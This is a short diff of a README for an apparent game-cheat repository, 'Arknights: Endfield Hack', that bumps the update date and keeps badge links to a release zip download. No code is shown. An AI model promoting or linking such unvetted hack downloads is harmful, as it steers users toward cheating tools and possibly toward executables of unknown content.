@@ -1,6 +1,6 @@
 # Arknights: Endfield Hack V1 (v1.4)
 
- _(UPD: 14 Sep 2026)_
+ _(UPD: 20 Sep 2026)_
 
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/SpeedStaffHonor/Endfield-Hack/releases/download/v1.4/Endfield.GUI-v1.4.zip)
 [![GitHub release](https://img.shields.io/badge/Release-v1.4-blue?style=for-the-badge)](https://github.com/SpeedStaffHonor/Endfield-Hack/releases/download/v1.4/Endfield.GUI-v1.4.zip)
